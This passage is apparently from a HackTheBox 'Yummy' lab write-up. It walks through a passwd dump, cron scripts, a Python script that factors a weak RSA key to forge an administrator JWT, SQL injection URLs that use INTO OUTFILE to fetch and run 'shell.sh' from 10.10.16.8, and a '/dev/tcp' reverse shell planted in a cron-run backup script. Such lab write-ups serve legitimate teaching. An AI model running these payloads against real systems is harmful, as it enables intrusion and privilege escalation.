class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">man:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:man</span><span class="symbol">:/var/cache/man</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">8</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">:news</span><span class="symbol">:/var/spool/news</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">10</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby">www-<span class="symbol">data:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:www-data</span><span class="symbol">:/var/www</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">backup:</span><span class="symbol">x:</span><span class="number">34</span><span class="symbol">:</span><span class="number">34</span><span class="symbol">:backup</span><span class="symbol">:/var/backups</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">list:</span><span class="symbol">x:</span><span class="number">38</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:Mailing</span> <span class="title class_">List</span> <span class="title class_">Manager</span><span class="symbol">:/var/list</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">irc:</span><span class="symbol">x:</span><span class="number">39</span><span class="symbol">:</span><span class="number">39</span><span class="symbol">:ircd</span><span class="symbol">:/run/ircd</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">_apt:</span><span class="symbol">x:</span><span class="number">42</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby">systemd-<span class="symbol">network:</span><span class="symbol">x:</span><span class="number">998</span><span class="symbol">:</span><span class="number">998</span><span class="symbol">:systemd</span> <span class="title class_">Network</span> <span class="title class_">Management</span><span class="symbol">:/</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby">systemd-<span class="symbol">timesync:</span><span class="symbol">x:</span><span class="number">997</span><span class="symbol">:</span><span class="number">997</span><span class="symbol">:systemd</span> <span class="title class_">Time</span> <span class="title class_">Synchronization</span><span class="symbol">:/</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">dhcpcd:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:DHCP</span> <span class="title class_">Client</span> <span class="title class_">Daemon</span>,,,<span class="symbol">:/usr/lib/dhcpcd</span><span class="symbol">:/bin/false</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">messagebus:</span><span class="symbol">x:</span><span class="number">101</span><span class="symbol">:</span><span class="number">102</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby">systemd-<span class="symbol">resolve:</span><span class="symbol">x:</span><span class="number">992</span><span class="symbol">:</span><span class="number">992</span><span class="symbol">:systemd</span> <span class="title class_">Resolver</span><span class="symbol">:/</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">pollinate:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:</span><span class="symbol">:/var/cache/pollinate</span><span class="symbol">:/bin/false</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">polkitd:</span><span class="symbol">x:</span><span class="number">991</span><span class="symbol">:</span><span class="number">991</span><span class="symbol">:User</span> <span class="keyword">for</span> <span class="symbol">polkitd:</span>/<span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">syslog:</span><span class="symbol">x:</span><span class="number">103</span><span class="symbol">:</span><span class="number">104</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">uuidd:</span><span class="symbol">x:</span><span class="number">104</span><span class="symbol">:</span><span class="number">105</span><span class="symbol">:</span><span class="symbol">:/run/uuidd</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">tcpdump:</span><span class="symbol">x:</span><span class="number">105</span><span class="symbol">:</span><span class="number">107</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">tss:</span><span class="symbol">x:</span><span class="number">106</span><span class="symbol">:</span><span class="number">108</span><span class="symbol">:TPM</span> software stack,,,<span class="symbol">:/var/lib/tpm</span><span class="symbol">:/bin/false</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">landscape:</span><span class="symbol">x:</span><span class="number">107</span><span class="symbol">:</span><span class="number">109</span><span class="symbol">:</span><span class="symbol">:/var/lib/landscape</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby">fwupd-<span class="symbol">refresh:</span><span class="symbol">x:</span><span class="number">989</span><span class="symbol">:</span><span class="number">989</span><span class="symbol">:Firmware</span> update <span class="symbol">daemon:</span>/var/lib/<span class="symbol">fwupd:</span>/usr/sbin/nologin</span></span><br><span class="line"><span class="language-ruby"><span class="symbol">usbmux:</span><span class="symbol">x:</span><span class="number">108</span><span class="symbol">:</span><span class="number">46</span><span class="symbol">:usbmux</span> daemon,,,<span class="symbol">:/var/lib/usbmux</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">109</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/run/sshd</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">dev:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:dev</span><span class="symbol">:/home/dev</span><span class="symbol">:/bin/bash</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">mysql:</span><span class="symbol">x:</span><span class="number">110</span><span class="symbol">:</span><span class="number">110</span><span class="symbol">:MySQL</span> <span class="title class_">Server</span>,,,<span class="symbol">:/nonexistent</span><span class="symbol">:/bin/false</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">caddy:</span><span class="symbol">x:</span><span class="number">999</span><span class="symbol">:</span><span class="number">988</span><span class="symbol">:Caddy</span> web <span class="symbol">server:</span>/var/lib/<span class="symbol">caddy:</span>/usr/sbin/nologin</span></span><br><span class="line"><span class="language-ruby"><span class="symbol">postfix:</span><span class="symbol">x:</span><span class="number">111</span><span class="symbol">:</span><span class="number">112</span><span class="symbol">:</span><span class="symbol">:/var/spool/postfix</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">qa:</span><span class="symbol">x:</span><span class="number">1001</span><span class="symbol">:</span><span class="number">1001</span><span class="symbol">:</span><span class="symbol">:/home/qa</span><span class="symbol">:/bin/bash</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">_laurel:</span><span class="symbol">x:</span><span class="number">996</span><span class="symbol">:</span><span class="number">987</span><span class="symbol">:</span><span class="symbol">:/var/log/laurel</span><span class="symbol">:/bin/false</span></span></span><br><span class="line"><span class="language-ruby"></span></span><br></pre></td></tr></table></figure></div>
+
+<p>After some trying, I decided to check cronjobs under <code>/etc/crontab</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line"><span class="comment"># You can also override PATH, but by default, newer versions inherit it from the environment</span></span><br><span class="line"><span class="comment">#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br><span class="line">17 *	* * *	root	<span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6	* * *	root	<span class="built_in">test</span> -x /usr/sbin/anacron || &#123; <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily; &#125;</span><br><span class="line">47 6	* * 7	root	<span class="built_in">test</span> -x /usr/sbin/anacron || &#123; <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly; &#125;</span><br><span class="line">52 6	1 * *	root	<span class="built_in">test</span> -x /usr/sbin/anacron || &#123; <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly; &#125;</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh</span><br><span class="line">*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh</span><br><span class="line">* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+<p>We can see that there’s and interesting <code>/data/scripts/app_backup.sh</code> , let’s check it out:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cd /var/www</span><br><span class="line">/usr/bin/rm backupapp.zip</span><br><span class="line">/usr/bin/zip -r backupapp.zip /opt/app</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s then download backupapp and see what it has for us:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Yummy/backup.png"
+                      alt="Source Code"
+                ><figcaption>Source Code</figcaption></figure></p>
+<p>One interesting thing is a signature.py script that’s being used:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate RSA key pair</span></span><br><span class="line">q = sympy.randprime(<span class="number">2</span>**<span class="number">19</span>, <span class="number">2</span>**<span class="number">20</span>)</span><br><span class="line">n = sympy.randprime(<span class="number">2</span>**<span class="number">1023</span>, <span class="number">2</span>**<span class="number">1024</span>) * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = n // q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi_n)</span><br><span class="line">key_data = &#123;<span class="string">&#x27;n&#x27;</span>: n, <span class="string">&#x27;e&#x27;</span>: e, <span class="string">&#x27;d&#x27;</span>: d, <span class="string">&#x27;p&#x27;</span>: p, <span class="string">&#x27;q&#x27;</span>: q&#125;</span><br><span class="line">key = RSA.construct((key_data[<span class="string">&#x27;n&#x27;</span>], key_data[<span class="string">&#x27;e&#x27;</span>], key_data[<span class="string">&#x27;d&#x27;</span>], key_data[<span class="string">&#x27;p&#x27;</span>], key_data[<span class="string">&#x27;q&#x27;</span>]))</span><br><span class="line">private_key_bytes = key.export_key()</span><br><span class="line"></span><br><span class="line">private_key = serialization.load_pem_private_key(</span><br><span class="line">    private_key_bytes,</span><br><span class="line">    password=<span class="literal">None</span>,</span><br><span class="line">    backend=default_backend()</span><br><span class="line">)</span><br><span class="line">public_key = private_key.public_key()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Also, when trying to decrypt our current JWT token, we can find some interesting leak:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Yummy/jwt.png"
+                      alt="Source Code"
+                ><figcaption>Source Code</figcaption></figure></p>
+<p>So I created this script that’ll help me to craft an administrator auth token:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">from</span> Cryptodome.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;&lt;auth-token&gt;&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">js = json.loads(base64.b64decode(token.split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>]+<span class="string">&quot;===&quot;</span>).decode())</span><br><span class="line">n = <span class="built_in">int</span>(js[<span class="string">&quot;jwk&quot;</span>][<span class="string">&#x27;n&#x27;</span>])</span><br><span class="line">p, q = <span class="built_in">list</span>((sympy.factorint(n)).keys())</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi_n)</span><br><span class="line"></span><br><span class="line">key_data = &#123;<span class="string">&#x27;n&#x27;</span>: n, <span class="string">&#x27;e&#x27;</span>: e, <span class="string">&#x27;d&#x27;</span>: d, <span class="string">&#x27;p&#x27;</span>: p, <span class="string">&#x27;q&#x27;</span>: q&#125;</span><br><span class="line">key = RSA.construct((key_data[<span class="string">&#x27;n&#x27;</span>], key_data[<span class="string">&#x27;e&#x27;</span>], key_data[<span class="string">&#x27;d&#x27;</span>], key_data[<span class="string">&#x27;p&#x27;</span>], key_data[<span class="string">&#x27;q&#x27;</span>]))</span><br><span class="line">private_key_bytes = key.export_key()</span><br><span class="line"></span><br><span class="line">private_key = serialization.load_pem_private_key(</span><br><span class="line">    private_key_bytes,</span><br><span class="line">    password=<span class="literal">None</span>,</span><br><span class="line">    backend=default_backend()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">public_key = private_key.public_key()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decode the token</span></span><br><span class="line">data = jwt.decode(token, public_key, algorithms=[<span class="string">&quot;RS256&quot;</span>])</span><br><span class="line">data[<span class="string">&quot;role&quot;</span>] = <span class="string">&quot;administrator&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Encode the new token</span></span><br><span class="line">new_token = jwt.encode(data, private_key, algorithm=<span class="string">&quot;RS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(new_token)</span><br></pre></td></tr></table></figure></div>
+
+
+<p>And with the help of our new token we are admin:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Yummy/admin.png"
+                      alt="Admin Dashboard"
+                ><figcaption>Admin Dashboard</figcaption></figure></p>
+<p>Now taking another closer look at our source code:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">admindashboard</span>():</span><br><span class="line">        validation = validate_login()</span><br><span class="line">        <span class="keyword">if</span> validation != <span class="string">&quot;administrator&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            connection = pymysql.connect(**db_config)</span><br><span class="line">            <span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = <span class="string">&quot;SELECT * from appointments&quot;</span></span><br><span class="line">                cursor.execute(sql)</span><br><span class="line">                connection.commit()</span><br><span class="line">                appointments = cursor.fetchall()</span><br><span class="line"></span><br><span class="line">                search_query = request.args.get(<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># added option to order the reservations</span></span><br><span class="line">                order_query = request.args.get(<span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                sql = <span class="string">f&quot;SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date <span class="subst">&#123;order_query&#125;</span>&quot;</span></span><br><span class="line">                cursor.execute(sql, (<span class="string">&#x27;%&#x27;</span> + search_query + <span class="string">&#x27;%&#x27;</span>,))</span><br><span class="line">                connection.commit()</span><br><span class="line">                appointments = cursor.fetchall()</span><br><span class="line">            connection.close()</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;admindashboard.html&#x27;</span>, appointments=appointments)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            flash(<span class="built_in">str</span>(e), <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;admindashboard.html&#x27;</span>, appointments=appointments)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that the <code>order_query</code> has no kind of filtering, SQLI then?</p>
+<h4 id="SQL-Injection-on-order-query-RCE"><a href="#SQL-Injection-on-order-query-RCE" class="headerlink" title="SQL Injection on order_query -&gt; RCE"></a>SQL Injection on order_query -&gt; RCE</h4><p>There was one more interesting file that we could check using the LFI which is <code>/data/scripts/dbmonitor.sh</code>: this script checks if the <code>dbstatus.json</code> file exists and if it exists AND does not contain <code>database is down</code>, it executes &#96;&#96;&#x2F;bin&#x2F;bash “$latest_version” where: latest_version&#x3D;$(&#x2F;usr&#x2F;bin&#x2F;ls -1 &#x2F;data&#x2F;scripts&#x2F;fixer-v* 2&gt;&#x2F;dev&#x2F;null | &#x2F;usr&#x2F;bin&#x2F;sort -V | &#x2F;usr&#x2F;bin&#x2F;tail -n 1)<br>So it will execute that code if write such a file there and write anything other than “database is down” to &#x2F;data&#x2F;scripts&#x2F;dbstatus.json.</p>
+<p>So I’ll just type the <code>ping;</code> command to our json file, and then execute a reverse shell command by triggering our fixer script to get a reverse shell:<br><a class="link"   target="_blank" rel="noopener" href="http://yummy.htb/admindashboard?s=&o=ASC;++select+%22ping;%22+INTO+OUTFILE++%27/data/scripts/dbstatus.json%27+;" >http://yummy.htb/admindashboard?s=&amp;o=ASC%3b++select+%22ping%3b%22+INTO+OUTFILE++%27/data/scripts/dbstatus.json%27+%3b <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="http://yummy.htb/admindashboard?s=&o=ASC;++select+%22curl+10.10.16.8/shell.sh+%7Cbash;%22+INTO+OUTFILE++%27/data/scripts/fixer-v___%27+;" >http://yummy.htb/admindashboard?s=&amp;o=ASC%3b++select+%22curl+10.10.16.8/shell.sh+|bash%3b%22+INTO+OUTFILE++%27/data/scripts/fixer-v___%27+%3b <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>And we get a callback:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Serving HTTP on :: port 80 (http://[::]:80/) ...</span><br><span class="line">::ffff:10.129.195.32 - - [21/Feb/2025 18:05:51] <span class="string">&quot;GET /shell.sh HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure></div>
+
+<p>And our shell:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.8] from (UNKNOWN) [10.129.195.32] 59042</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=110(mysql) gid=110(mysql) groups=110(mysql)</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Pivoting-to-qa-user"><a href="#Pivoting-to-qa-user" class="headerlink" title="Pivoting to qa user"></a>Pivoting to qa user</h4><p>As we can can remember the backup script from earlier, let’s manipulate it and change it to run us a reverse shell script:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql@yummy:/data/scripts$ wget 10.10.16.8/shell.sh</span><br><span class="line">wget 10.10.16.8/shell.sh</span><br><span class="line">--2025-02-21 17:27:24--  http://10.10.16.8/shell.sh</span><br><span class="line">Connecting to 10.10.16.8:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 39 [application/x-sh]</span><br><span class="line">Saving to: ΓÇÿshell.shΓÇÖ</span><br><span class="line"></span><br><span class="line">shell.sh            100%[===================&gt;]      39  --.-KB/s    <span class="keyword">in</span> 0.002s</span><br><span class="line"></span><br><span class="line">2025-02-21 17:27:26 (22.0 KB/s) - ΓÇÿshell.shΓÇÖ saved [39/39]</span><br><span class="line"></span><br><span class="line">mysql@yummy:/data/scripts$ <span class="built_in">mv</span> /data/scripts/app_backup.sh /data/scripts/app_backup.sh.old</span><br><span class="line">&lt;ripts/app_backup.sh /data/scripts/app_backup.sh.old</span><br><span class="line"><span class="built_in">mv</span>: replace <span class="string">&#x27;/data/scripts/app_backup.sh.old&#x27;</span>, overriding mode 0644 (rw-r--r--)? y</span><br><span class="line">y</span><br><span class="line">mysql@yummy:/data/scripts$ <span class="built_in">mv</span> shell.sh /data/scripts/app_backup.sh</span><br><span class="line"><span class="built_in">mv</span> shell.sh /data/scripts/app_backup.sh</span><br><span class="line">mysql@yummy:/data/scripts$ <span class="built_in">cat</span> app_backup.sh</span><br><span class="line"><span class="built_in">cat</span> app_backup.sh</span><br><span class="line">sh -i &gt;&amp; /dev/tcp/10.10.16.8/9001 0&gt;&amp;1</span><br><span class="line">mysql@yummy:/data/scripts$</span><br></pre></td></tr></table></figure></div>
+
+<p>And we are in:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">connect to [10.10.16.8] from (UNKNOWN) [10.129.195.32] 42268</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Doing some guessy enumeration on the directory I’m in I find qa’s password:</p>
